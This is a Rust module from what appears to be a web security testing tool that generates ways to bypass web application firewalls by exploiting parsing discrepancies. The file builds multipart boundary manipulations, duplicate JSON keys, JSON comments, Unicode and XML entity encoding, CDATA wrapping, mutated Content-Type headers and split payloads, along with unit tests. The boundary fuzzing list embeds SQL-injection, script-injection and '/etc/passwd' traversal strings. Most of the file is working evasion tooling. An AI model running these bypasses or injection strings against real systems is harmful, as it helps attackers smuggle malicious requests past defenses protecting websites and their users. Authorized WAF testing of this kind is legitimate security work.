//! WAFFLED-inspired WAF bypass techniques using parsing discrepancies
//!
//! Based on research: "Bypassing Web Application Firewalls by Exploiting Parsing Discrepancies"
//! These techniques exploit differences in how WAFs and backend applications parse HTTP requests
//!
//! ⚠️ WARNING: Use only for authorized security testing with explicit consent

use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// Content-type specific parsing discrepancy techniques
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ParsingDiscrepancyTechnique {
    pub name: String,
    pub description: String,
    pub content_type: String,
    pub mutation_type: MutationType,
    pub headers: HashMap<String, String>,
    pub body_template: String,
    pub severity: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum MutationType {
    BoundaryManipulation,
    HeaderStructure,
    ParameterContinuation,
    ContentTypeVariation,
    EncodingDiscrepancy,
    WhitespaceInjection,
}

/// Get WAFFLED-inspired parsing discrepancy techniques
pub fn get_parsing_discrepancy_techniques() -> Vec<ParsingDiscrepancyTechnique> {
    vec![
        // Multipart/form-data techniques
        ParsingDiscrepancyTechnique {
            name: "Boundary Delimiter Manipulation".to_string(),
            description: "Exploit differences in boundary parsing between WAF and application"
                .to_string(),
            content_type: "multipart/form-data".to_string(),
            mutation_type: MutationType::BoundaryManipulation,
            headers: HashMap::from([(
                "Content-Type".to_string(),
                "multipart/form-data; boundary=--boundary123".to_string(),
            )]),
            body_template: r#"----boundary123
Content-Disposition: form-data; name="param"

{{PAYLOAD}}
----boundary123--"#
                .to_string(),
            severity: "HIGH".to_string(),
        },
        ParsingDiscrepancyTechnique {
            name: "Duplicate Boundary Parameters".to_string(),
            description: "Use multiple boundary definitions to confuse parsers".to_string(),
            content_type: "multipart/form-data".to_string(),
            mutation_type: MutationType::BoundaryManipulation,
            headers: HashMap::from([(
                "Content-Type".to_string(),
                "multipart/form-data; boundary=A; boundary=B".to_string(),
            )]),
            body_template: r#"--B
Content-Disposition: form-data; name="param"

{{PAYLOAD}}
--B--"#
                .to_string(),
            severity: "HIGH".to_string(),
        },
        ParsingDiscrepancyTechnique {
            name: "Space in Boundary".to_string(),
            description: "Insert spaces in boundary to exploit lenient parsers".to_string(),
            content_type: "multipart/form-data".to_string(),
            mutation_type: MutationType::BoundaryManipulation,
            headers: HashMap::from([(
                "Content-Type".to_string(),
                "multipart/form-data; boundary=\"my boundary\"".to_string(),
            )]),
            body_template: r#"--my boundary
Content-Disposition: form-data; name="param"

{{PAYLOAD}}
--my boundary--"#
                .to_string(),
            severity: "MEDIUM".to_string(),
        },
        // JSON techniques
        ParsingDiscrepancyTechnique {
            name: "JSON Unicode Escape".to_string(),
            description: "Use Unicode escapes in JSON to bypass pattern matching".to_string(),
            content_type: "application/json".to_string(),
            mutation_type: MutationType::EncodingDiscrepancy,
            headers: HashMap::from([("Content-Type".to_string(), "application/json".to_string())]),
            body_template: r#"{"param": "\u0070\u0061\u0079\u006c\u006f\u0061\u0064"}"#.to_string(),
            severity: "MEDIUM".to_string(),
        },
        ParsingDiscrepancyTechnique {
            name: "JSON Comments Injection".to_string(),
            description: "Some parsers accept comments in JSON while others don't".to_string(),
            content_type: "application/json".to_string(),
            mutation_type: MutationType::WhitespaceInjection,
            headers: HashMap::from([("Content-Type".to_string(), "application/json".to_string())]),
            body_template: r#"{
    "param": /* comment */ "{{PAYLOAD}}" // another comment
}"#
            .to_string(),
            severity: "MEDIUM".to_string(),
        },
        ParsingDiscrepancyTechnique {
            name: "Duplicate JSON Keys".to_string(),
            description: "Exploit different handling of duplicate keys".to_string(),
            content_type: "application/json".to_string(),
            mutation_type: MutationType::ParameterContinuation,
            headers: HashMap::from([("Content-Type".to_string(), "application/json".to_string())]),
            body_template: r#"{"param": "safe", "param": "{{PAYLOAD}}"}"#.to_string(),
            severity: "HIGH".to_string(),
        },
        // XML techniques
        ParsingDiscrepancyTechnique {
            name: "XML Entity Encoding".to_string(),
            description: "Use XML entities to encode payloads".to_string(),
            content_type: "application/xml".to_string(),
            mutation_type: MutationType::EncodingDiscrepancy,
            headers: HashMap::from([("Content-Type".to_string(), "application/xml".to_string())]),
            body_template: r#"<?xml version="1.0"?>
<root>
    <param>&#x70;&#x61;&#x79;&#x6c;&#x6f;&#x61;&#x64;</param>
</root>"#
                .to_string(),
            severity: "MEDIUM".to_string(),
        },
        ParsingDiscrepancyTechnique {
            name: "XML CDATA Section".to_string(),
            description: "Hide payloads in CDATA sections".to_string(),
            content_type: "application/xml".to_string(),
            mutation_type: MutationType::ContentTypeVariation,
            headers: HashMap::from([("Content-Type".to_string(), "application/xml".to_string())]),
            body_template: r#"<?xml version="1.0"?>
<root>
    <param><![CDATA[{{PAYLOAD}}]]></param>
</root>"#
                .to_string(),
            severity: "MEDIUM".to_string(),
        },
        // Content-Type variations
        ParsingDiscrepancyTechnique {
            name: "Content-Type Charset Manipulation".to_string(),
            description: "Add charset to confuse content-type parsing".to_string(),
            content_type: "application/x-www-form-urlencoded".to_string(),
            mutation_type: MutationType::ContentTypeVariation,
            headers: HashMap::from([(
                "Content-Type".to_string(),
                "application/x-www-form-urlencoded; charset=utf-8".to_string(),
            )]),
            body_template: "param={{PAYLOAD}}".to_string(),
            severity: "LOW".to_string(),
        },
        ParsingDiscrepancyTechnique {
            name: "Mixed Case Content-Type".to_string(),
            description: "Use mixed case in content-type header".to_string(),
            content_type: "application/json".to_string(),
            mutation_type: MutationType::HeaderStructure,
            headers: HashMap::from([("Content-Type".to_string(), "Application/JSON".to_string())]),
            body_template: r#"{"param": "{{PAYLOAD}}"}"#.to_string(),
            severity: "LOW".to_string(),
        },
        ParsingDiscrepancyTechnique {
            name: "Content-Type with Extra Parameters".to_string(),
            description: "Add unexpected parameters to content-type".to_string(),
            content_type: "application/json".to_string(),
            mutation_type: MutationType::HeaderStructure,
            headers: HashMap::from([(
                "Content-Type".to_string(),
                "application/json; version=1.0; foo=bar".to_string(),
            )]),
            body_template: r#"{"param": "{{PAYLOAD}}"}"#.to_string(),
            severity: "MEDIUM".to_string(),
        },
        // Parameter pollution techniques
        ParsingDiscrepancyTechnique {
            name: "Parameter Fragmentation".to_string(),
            description: "Split parameters across multiple parts".to_string(),
            content_type: "multipart/form-data".to_string(),
            mutation_type: MutationType::ParameterContinuation,
            headers: HashMap::from([(
                "Content-Type".to_string(),
                "multipart/form-data; boundary=boundary".to_string(),
            )]),
            body_template: r#"--boundary
Content-Disposition: form-data; name="par"

{{PAYLOAD_PART1}}
--boundary
Content-Disposition: form-data; name="am"

{{PAYLOAD_PART2}}
--boundary--"#
                .to_string(),
            severity: "HIGH".to_string(),
        },
    ]
}

/// Apply a parsing discrepancy technique to a payload
pub fn apply_parsing_technique(
    technique: &ParsingDiscrepancyTechnique,
    payload: &str,
) -> (HashMap<String, String>, String) {
    let headers = technique.headers.clone();
    let body = match technique.mutation_type {
        MutationType::ParameterContinuation => {
            // Split payload for fragmentation
            let mid = payload.len() / 2;
            technique
                .body_template
                .replace("{{PAYLOAD_PART1}}", &payload[..mid])
                .replace("{{PAYLOAD_PART2}}", &payload[mid..])
        }
        MutationType::EncodingDiscrepancy => {
            // Apply encoding based on content type
            match technique.content_type.as_str() {
                "application/json" => {
                    // Unicode escape the payload
                    let escaped = payload
                        .chars()
                        .map(|c| format!("\\u{:04x}", c as u32))
                        .collect::<String>();
                    technique.body_template.replace("{{PAYLOAD}}", &escaped)
                }
                "application/xml" => {
                    // XML entity encode
                    let encoded = payload
                        .chars()
                        .map(|c| format!("&#{};", c as u32))
                        .collect::<String>();
                    technique.body_template.replace("{{PAYLOAD}}", &encoded)
                }
                _ => technique.body_template.replace("{{PAYLOAD}}", payload),
            }
        }
        _ => {
            // Default: simple replacement
            technique.body_template.replace("{{PAYLOAD}}", payload)
        }
    };

    (headers, body)
}

/// Generate content-type fuzzing variations
pub fn generate_content_type_variations(base_content_type: &str) -> Vec<String> {
    vec![
        // Original
        base_content_type.to_string(),
        // Whitespace variations
        format!("{};", base_content_type),
        format!("{}; ", base_content_type),
        format!("{} ;", base_content_type),
        format!(" {}", base_content_type),
        format!("{} ", base_content_type),
        format!("\t{}", base_content_type),
        format!("{}\t", base_content_type),
        // Charset variations
        format!("{}; charset=utf-8", base_content_type),
        format!("{}; charset=UTF-8", base_content_type),
        format!("{}; charset=\"utf-8\"", base_content_type),
        format!("{}; charset='utf-8'", base_content_type),
        format!("{}; charset = utf-8", base_content_type),
        format!("{}; charset=iso-8859-1", base_content_type),
        format!("{}; charset=windows-1252", base_content_type),
        format!("{}; charset=utf-16", base_content_type),
        // Parameter variations
        format!("{}; boundary=", base_content_type),
        format!("{}; boundary=--", base_content_type),
        format!("{}; boundary=\"\"", base_content_type),
        format!("{}; version=1.0", base_content_type),
        format!("{}; foo=bar", base_content_type),
        format!("{}; x=y; a=b", base_content_type),
        // Case variations
        base_content_type.to_uppercase(),
        base_content_type.to_lowercase(),
        capitalize_words(base_content_type),
        // Mixed case
        base_content_type
            .chars()
            .enumerate()
            .map(|(i, c)| {
                if i % 2 == 0 {
                    c.to_uppercase().to_string()
                } else {
                    c.to_lowercase().to_string()
                }
            })
            .collect::<String>(),
        // Duplicated parameters
        format!("{}; charset=utf-8; charset=iso-8859-1", base_content_type),
        format!("{}; boundary=A; boundary=B", base_content_type),
        // Comment-like additions
        format!("{}; (comment)", base_content_type),
        format!("{}; /*comment*/", base_content_type),
        // URL encoding
        url_encode_content_type(base_content_type),
        // Multiple content types
        format!("{}, text/plain", base_content_type),
        format!("text/plain, {}", base_content_type),
        // Invalid but potentially parsed
        format!("{};;;;;", base_content_type),
        format!("{} ; ; ;", base_content_type),
        format!("{};;charset=utf-8", base_content_type),
        // Unicode variations
        format!("{}\u{200B}", base_content_type), // Zero-width space
        format!("{}\u{00A0}", base_content_type), // Non-breaking space
        format!("{}\u{FEFF}", base_content_type), // Zero-width no-break space
    ]
}

/// Capitalize each word in the content type
fn capitalize_words(s: &str) -> String {
    s.split('-')
        .map(|word| {
            let mut chars = word.chars();
            match chars.next() {
                None => String::new(),
                Some(first) => first.to_uppercase().collect::<String>() + chars.as_str(),
            }
        })
        .collect::<Vec<String>>()
        .join("-")
}

/// URL encode the content type
fn url_encode_content_type(ct: &str) -> String {
    ct.chars()
        .map(|c| match c {
            '/' => "%2F".to_string(),
            '-' => "%2D".to_string(),
            '+' => "%2B".to_string(),
            _ => c.to_string(),
        })
        .collect()
}

/// Generate content-type mutation techniques for testing
pub fn get_content_type_mutation_techniques() -> Vec<ParsingDiscrepancyTechnique> {
    let base_types = vec![
        "application/x-www-form-urlencoded",
        "application/json",
        "application/xml",
        "text/xml",
        "multipart/form-data",
    ];

    let mut techniques = Vec::new();

    for base_type in base_types {
        let variations = generate_content_type_variations(base_type);

        // Take the most interesting variations for each type
        let selected_variations = vec![
            variations.get(7).cloned(),  // Tab prefix
            variations.get(14).cloned(), // charset with spaces
            variations.get(24).cloned(), // Case variation
            variations.get(30).cloned(), // URL encoded
            variations.get(36).cloned(), // Unicode zero-width space
        ];

        for (i, variation) in selected_variations.into_iter().flatten().enumerate() {
            techniques.push(ParsingDiscrepancyTechnique {
                name: format!("Content-Type Mutation {} - {}", base_type, i + 1),
                description: format!("Mutated content-type header for {base_type}"),
                content_type: base_type.to_string(),
                mutation_type: MutationType::ContentTypeVariation,
                headers: HashMap::from([("Content-Type".to_string(), variation)]),
                body_template: match base_type {
                    "application/json" => r#"{"param": "{{PAYLOAD}}"}"#.to_string(),
                    "application/xml" | "text/xml" => {
                        r#"<?xml version="1.0"?><root><param>{{PAYLOAD}}</param></root>"#
                            .to_string()
                    }
                    "multipart/form-data" => r#"--boundary
Content-Disposition: form-data; name="param"

{{PAYLOAD}}
--boundary--"#
                        .to_string(),
                    _ => "param={{PAYLOAD}}".to_string(),
                },
                severity: "MEDIUM".to_string(),
            });
        }
    }

    techniques
}

/// Generate multipart boundary fuzzing techniques
pub fn get_boundary_fuzzing_techniques() -> Vec<ParsingDiscrepancyTechnique> {
    let long_boundary = "A".repeat(200);
    let boundary_variations = vec![
        // Standard boundaries
        (
            "Standard",
            "----WebKitFormBoundary7MA4YWxkTrZu0gW".to_string(),
        ),
        ("Numeric", "1234567890".to_string()),
        ("Short", "X".to_string()),
        ("Empty-like", "--".to_string()),
        // Special characters
        ("Special chars", "boundary!@#$%^&*()".to_string()),
        ("Spaces", "my boundary with spaces".to_string()),
        ("Unicode", "boundary-\u{1F4A9}-test".to_string()),
        ("Newline", "boundary\r\n".to_string()),
        // Length variations
        ("Very long", long_boundary),
        ("With quotes", "\"quoted-boundary\"".to_string()),
        ("With equals", "boundary=value".to_string()),
        // Malformed variations
        ("Missing dashes", "boundary".to_string()),
        ("Extra dashes", "------boundary".to_string()),
        ("Mixed case", "BoUnDaRy".to_string()),
        // Injection attempts
        ("SQL-like", "boundary'; DROP TABLE--".to_string()),
        (
            "Script-like",
            "boundary<script>alert(1)</script>".to_string(),
        ),
        ("Path-like", "boundary/../../etc/passwd".to_string()),
    ];

    let mut techniques = Vec::new();

    for (name, boundary) in boundary_variations {
        // Technique 1: Boundary in header doesn't match body
        techniques.push(ParsingDiscrepancyTechnique {
            name: format!("Boundary Mismatch - {name}"),
            description: format!("Header boundary differs from body boundary: {boundary}"),
            content_type: "multipart/form-data".to_string(),
            mutation_type: MutationType::BoundaryManipulation,
            headers: HashMap::from([(
                "Content-Type".to_string(),
                "multipart/form-data; boundary=normalBoundary".to_string(),
            )]),
            body_template: format!(
                r#"--{boundary}
Content-Disposition: form-data; name="param"

{{{{PAYLOAD}}}}
--{boundary}--"#
            ),
            severity: "HIGH".to_string(),
        });

        // Technique 2: Malformed boundary declaration
        techniques.push(ParsingDiscrepancyTechnique {
            name: format!("Malformed Declaration - {name}"),
            description: format!("Malformed boundary parameter: {boundary}"),
            content_type: "multipart/form-data".to_string(),
            mutation_type: MutationType::BoundaryManipulation,
            headers: HashMap::from([(
                "Content-Type".to_string(),
                format!("multipart/form-data;boundary={boundary}"),
            )]),
            body_template: format!(
                r#"--{boundary}
Content-Disposition: form-data; name="param"

{{{{PAYLOAD}}}}
--{boundary}--"#
            ),
            severity: "MEDIUM".to_string(),
        });

        // Technique 3: Multiple boundary parameters
        techniques.push(ParsingDiscrepancyTechnique {
            name: format!("Duplicate Boundary - {name}"),
            description: format!("Multiple boundary declarations with: {boundary}"),
            content_type: "multipart/form-data".to_string(),
            mutation_type: MutationType::BoundaryManipulation,
            headers: HashMap::from([(
                "Content-Type".to_string(),
                format!("multipart/form-data; boundary=first; boundary={boundary}"),
            )]),
            body_template: format!(
                r#"--{boundary}
Content-Disposition: form-data; name="param"

{{{{PAYLOAD}}}}
--{boundary}--"#
            ),
            severity: "HIGH".to_string(),
        });
    }

    // Add some specific advanced techniques
    techniques.push(ParsingDiscrepancyTechnique {
        name: "Nested Multipart".to_string(),
        description: "Nested multipart boundaries to confuse parsers".to_string(),
        content_type: "multipart/form-data".to_string(),
        mutation_type: MutationType::BoundaryManipulation,
        headers: HashMap::from([(
            "Content-Type".to_string(),
            "multipart/form-data; boundary=outer".to_string(),
        )]),
        body_template: r#"--outer
Content-Type: multipart/form-data; boundary=inner
Content-Disposition: form-data; name="nested"

--inner
Content-Disposition: form-data; name="param"

{{PAYLOAD}}
--inner--
--outer--"#
            .to_string(),
        severity: "HIGH".to_string(),
    });

    techniques.push(ParsingDiscrepancyTechnique {
        name: "Boundary Injection".to_string(),
        description: "Inject fake boundary end markers".to_string(),
        content_type: "multipart/form-data".to_string(),
        mutation_type: MutationType::BoundaryManipulation,
        headers: HashMap::from([(
            "Content-Type".to_string(),
            "multipart/form-data; boundary=BOUNDARY".to_string(),
        )]),
        body_template: r#"--BOUNDARY
Content-Disposition: form-data; name="param"

{{PAYLOAD}}
--BOUNDARY--
Content-Disposition: form-data; name="extra"

This should be ignored
--BOUNDARY--"#
            .to_string(),
        severity: "HIGH".to_string(),
    });

    techniques
}

/// Generate a random boundary string for fuzzing
pub fn generate_random_boundary() -> String {
    use rand::{thread_rng, Rng};

    let mut rng = thread_rng();
    let length = rng.gen_range(1..=70); // RFC 2046 allows up to 70 chars

    // Mix of different character types
    let charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&'*+-.^_`|~";
    let boundary: String = (0..length)
        .map(|_| {
            let idx = rng.gen_range(0..charset.len());
            charset.chars().nth(idx).unwrap()
        })
        .collect();

    boundary
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parsing_techniques_generation() {
        let techniques = get_parsing_discrepancy_techniques();
        assert!(!techniques.is_empty());

        // Check we have techniques for each content type
        let has_multipart = techniques
            .iter()
            .any(|t| t.content_type.contains("multipart"));
        let has_json = techniques.iter().any(|t| t.content_type.contains("json"));
        let has_xml = techniques.iter().any(|t| t.content_type.contains("xml"));

        assert!(has_multipart);
        assert!(has_json);
        assert!(has_xml);
    }

    #[test]
    fn test_apply_parsing_technique() {
        let techniques = get_parsing_discrepancy_techniques();
        let json_technique = techniques
            .iter()
            .find(|t| t.name == "JSON Unicode Escape")
            .unwrap();

        let (headers, body) = apply_parsing_technique(json_technique, "test");
        assert!(headers.contains_key("Content-Type"));
        assert!(body.contains("\\u"));
    }

    #[test]
    fn test_content_type_variations() {
        let variations = generate_content_type_variations("application/json");
        assert!(variations.len() > 20); // We now have many more variations
        assert!(variations.contains(&"application/json".to_string()));
        assert!(variations.contains(&"APPLICATION/JSON".to_string()));
        assert!(variations.iter().any(|v| v.contains("charset")));
        assert!(variations.iter().any(|v| v.contains("%2F"))); // URL encoded
    }

    #[test]
    fn test_content_type_mutation_techniques() {
        let techniques = get_content_type_mutation_techniques();
        assert!(!techniques.is_empty());

        // Check we have mutations for each content type
        let has_json = techniques.iter().any(|t| t.content_type.contains("json"));
        let has_xml = techniques.iter().any(|t| t.content_type.contains("xml"));
        let has_multipart = techniques
            .iter()
            .any(|t| t.content_type.contains("multipart"));

        assert!(has_json);
        assert!(has_xml);
        assert!(has_multipart);

        // Check that all have ContentTypeVariation mutation type
        assert!(techniques
            .iter()
            .all(|t| matches!(t.mutation_type, MutationType::ContentTypeVariation)));
    }

    #[test]
    fn test_capitalize_words() {
        assert_eq!(capitalize_words("application-json"), "Application-Json");
        assert_eq!(capitalize_words("text-xml"), "Text-Xml");
        assert_eq!(
            capitalize_words("multipart-form-data"),
            "Multipart-Form-Data"
        );
    }

    #[test]
    fn test_url_encode_content_type() {
        assert_eq!(
            url_encode_content_type("application/json"),
            "application%2Fjson"
        );
        assert_eq!(
            url_encode_content_type("text/xml+xhtml"),
            "text%2Fxml%2Bxhtml"
        );
    }

    #[test]
    fn test_boundary_fuzzing_techniques() {
        let techniques = get_boundary_fuzzing_techniques();
        assert!(!techniques.is_empty());

        // Check we have various boundary manipulation types
        let has_mismatch = techniques.iter().any(|t| t.name.contains("Mismatch"));
        let has_malformed = techniques.iter().any(|t| t.name.contains("Malformed"));
        let has_duplicate = techniques.iter().any(|t| t.name.contains("Duplicate"));
        let has_nested = techniques.iter().any(|t| t.name.contains("Nested"));

        assert!(has_mismatch);
        assert!(has_malformed);
        assert!(has_duplicate);
        assert!(has_nested);

        // All should be boundary manipulation type
        assert!(techniques
            .iter()
            .all(|t| matches!(t.mutation_type, MutationType::BoundaryManipulation)));
    }

    #[test]
    fn test_generate_random_boundary() {
        // Test multiple times to ensure randomness
        let boundaries: Vec<String> = (0..10).map(|_| generate_random_boundary()).collect();

        // Check all are within valid length
        assert!(boundaries.iter().all(|b| !b.is_empty() && b.len() <= 70));

        // Check they're not all the same (randomness)
        let unique_count = boundaries
            .iter()
            .collect::<std::collections::HashSet<_>>()
            .len();
        assert!(unique_count > 5); // At least half should be unique
    }
}
